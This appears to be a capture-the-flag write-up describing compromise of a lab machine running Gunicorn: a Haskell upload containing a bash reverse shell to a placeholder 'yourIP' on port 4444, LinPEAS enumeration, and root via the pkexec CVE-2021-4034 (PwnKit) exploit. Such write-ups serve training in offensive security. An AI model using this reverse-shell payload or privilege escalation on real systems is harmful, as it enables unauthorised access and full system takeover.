Using nmap to scan ports reveals that port 5001 uses Gunicorn. Gunicorn is a lightweight, high-performance, open-source WSGI HTTP server for Python applications (Flask, Django, etc.) on UNIX.
<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/fd9ffaa9-63e6-4304-83fe-6b5e4b2240eb" />

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/e015f1b3-735f-45c1-94cf-3e674def72ff" />

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/3ab3a37e-1b65-414a-b2a2-78b0b8f25043" />

He said that only Haskell files could be used for uploading. When I clicked on the link he provided, it wasn't there. So I'll have to scan the folder.

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/a5089ead-386e-4deb-8e15-5b948296cf2d" />

Now I will create the hs file with the code below. import System.Process Allows Haskell to run system commands, similar to os.system() in Python. main::IO()
Type declaration required in Haskell, similar to void main() in C. main = do
do allows writing multiple commands in a top-down order.

import System.Process
main :: IO ()
main = do
    callCommand "bash -c 'bash -i >& /dev/tcp/yourIP/4444 0>&1'"


<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/3bf98194-8d0f-4388-a88a-c94150f88bd4" />

So, I found the user flag. Then I used Linpeas to automatically find vulnerabilities. (You can use Python web browser to download Linpeas, then use wget to download it to your hacked system, using chmod +x to grant permissions and ./ to execute.)

pkexec is a binary included in PolicyKit (polkit) – a permission management tool on Linux that allows regular users to run commands with higher privileges.
searching google I found CVE-2021-4034 - A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/a76b7baf-e872-4d47-ba13-0dd7a1384ef1" />

Don't forget to upgrade your shell tty to use the sudo command.

<img width="2558" height="1359" alt="image" src="https://github.com/user-attachments/assets/030bca64-1c65-4173-b037-f67406e97fc2" />

You can download this script to easily get root privileges https://github.com/ly4k/PwnKit

<img width="1915" height="700" alt="image" src="https://github.com/user-attachments/assets/6ed9765a-2b0d-46a1-b250-67988a03798f" />

yass, thats how I found root flag












